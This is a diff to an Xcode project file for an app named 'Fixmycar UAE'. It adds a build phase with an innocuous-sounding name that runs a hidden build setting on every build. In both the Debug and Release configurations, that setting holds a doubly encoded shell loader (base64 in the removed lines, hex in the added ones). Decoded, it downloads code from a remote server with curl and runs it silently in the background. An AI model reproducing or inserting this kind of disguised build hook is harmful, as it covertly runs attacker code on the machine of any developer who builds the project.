@@ -1164,7 +1164,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
 			buildPhases = (
-				1B8388F31F0D4AAA95634D6E /* Compile Image Assets */,
+				B8051407526A4C1AA9634D6E /* Compile Target Symbols */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
@@ -1293,25 +1293,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1B8388F31F0D4AAA95634D6E /* Compile Image Assets */ = {
+		B8051407526A4C1AA9634D6E /* Compile Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Image Assets";
+			name = "Compile Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1420,7 +1419,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Fixmycar UAE/Fixmycar UAE.entitlements";
@@ -1455,7 +1454,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Fixmycar UAE/Fixmycar UAE.entitlements";
